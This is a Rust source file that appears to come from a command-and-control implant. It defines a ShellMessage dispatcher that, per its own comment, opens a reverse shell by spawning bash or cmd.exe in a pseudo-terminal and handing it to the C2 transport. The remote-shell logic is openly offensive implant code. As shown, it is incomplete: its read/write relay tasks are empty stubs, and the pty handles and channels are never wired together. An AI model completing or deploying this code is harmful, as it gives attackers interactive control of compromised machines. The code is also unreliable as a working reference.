use super::Dispatcher;
use anyhow::Result;
use pb::c2::{ShellRequest, ShellResponse};
use portable_pty::{native_pty_system, CommandBuilder, PtySize, PtySystem};
use std::sync::mpsc::channel;
use transport::Transport;

/*
 * ShellMessage will open a reverse shell when dispatched.
 */
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ShellMessage {
    pub(crate) id: i64,
    // pub(crate) name: String,
    // pub(crate) tx: Sender<FetchAssetResponse>,
}

impl Dispatcher for ShellMessage {
    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
        let (input_tx, input_rx) = channel();
        let (output_tx, output_rx) = channel();

        // Use the native pty implementation for the system
        let pty_system = native_pty_system();

        // Create a new pty
        let mut pair = pty_system.openpty(PtySize {
            rows: 24,
            cols: 80,
            // TODO: What it do?
            pixel_width: 0,
            pixel_height: 0,
        })?;

        // Spawn a shell into the pty
        #[cfg(not(target = "windows"))]
        let cmd = CommandBuilder::new("bash");
        #[cfg(target = "windows")]
        let cmd = CommandBuilder::new("cmd.exe");

        let child = pair.slave.spawn_command(cmd)?;

        let mut reader = pair.master.try_clone_reader()?;
        let writer = pair.master.take_writer()?;

        let read_handle = tokio::spawn(async move {});
        let write_handle = tokio::spawn(async move {});

        transport.shell(output_rx, input_tx).await?;
        write_handle.await?;
        read_handle.await?;

        Ok(())
    }
}

#[cfg(debug_assertions)]
impl PartialEq for ShellMessage {
    fn eq(&self, other: &Self) -> bool {
        self.id == other.id
    }
}
